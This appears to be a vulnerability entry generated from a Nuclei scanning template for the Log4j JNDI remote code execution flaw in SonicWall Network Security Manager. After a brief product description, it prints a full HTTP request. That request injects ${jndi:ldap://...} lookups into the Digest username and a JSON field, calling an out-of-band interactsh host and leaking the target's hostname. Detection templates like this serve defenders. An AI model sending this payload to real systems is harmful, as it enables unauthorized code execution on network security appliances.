# Vulnerability: Sonicwall NSM - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77
**Source:** Nuclei Template (`sonicwall-nsm-log4j-rce.yaml`)

## Description
Sonicwall NSM is susceptible to Log4j JNDI remote code execution. SonicWall Network Security Manager (NSM) allows you to centrally orchestrate all firewall operations error-free, see and manage threats and risks across your firewall ecosystem from one place, and stay connected and compliant.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/sonicos/auth HTTP/1.1
Host: {{Hostname}}
X-Snwl-Timer: no-reset
Authorization: Digest username="${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/}", realm="admin-users@x.x.x.x", uri="/api/sonicos/auth", algorithm=SHA-256
Content-Type: application/json
Accept: application/json, text/plain, /
X-Snwl-Api-Scope: extended
Origin: {{RootURL}}
Referer: {{RootURL}}

{"override":false,"snwl":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}"}
```

